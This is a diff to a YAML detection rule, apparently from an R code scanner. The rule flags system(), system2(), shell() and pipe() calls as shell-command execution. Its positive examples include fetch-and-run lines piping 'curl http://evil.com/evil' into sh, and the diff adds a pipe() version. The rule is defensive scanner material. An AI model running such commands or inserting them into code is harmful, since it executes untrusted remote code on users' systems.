@@ -1,15 +1,17 @@
 name: system_pattern
-version: "0.1.0"
+version: "0.2.0"
 type: warning
-message: >-
-  system(), system2(), and shell() (on Windows) execute arbitrary shell
-  commands.
 attck:
+  - T1059.003
   - T1059.004
   - T1195.002
+message: >-
+  system(), system2(), shell() (on Windows), and pipe() execute arbitrary shell
+  commands.
 xpath: >-
   //SYMBOL_FUNCTION_CALL[
-    (text() = 'system' or text() = 'system2' or text() = 'shell')
+    (text() = 'system' or text() = 'system2' or text() = 'shell'
+      or text() = 'pipe')
     and not(preceding-sibling::OP-DOLLAR)
     and not(preceding-sibling::OP-AT)
   ]
@@ -26,6 +28,10 @@ positive_examples:
     base::system2("sh", args = c("-c", shQuote("curl http://evil.com/evil | sh")))
   - |
     base::shell("curl http://evil.com/evil | sh")
+  - |
+    pipe("curl http://evil.com/evil | sh", "w")
+  - |
+    con <- pipe("mkdir -p /tmp/evil")
 negative_examples:
   - |
     foo <- system
@@ -34,15 +40,20 @@ negative_examples:
   - |
     foo <- shell
   - |
+    foo <- pipe
+  - |
     foo$system("bar")
   - |
     foo$system2("bar")
   - |
     foo$shell("bar")
   - |
+    foo$pipe("bar")
+  - |
     foo@system("bar")
   - |
     foo@system2("bar")
   - |
     foo@shell("bar")
-
+  - |
+    foo@pipe("bar")
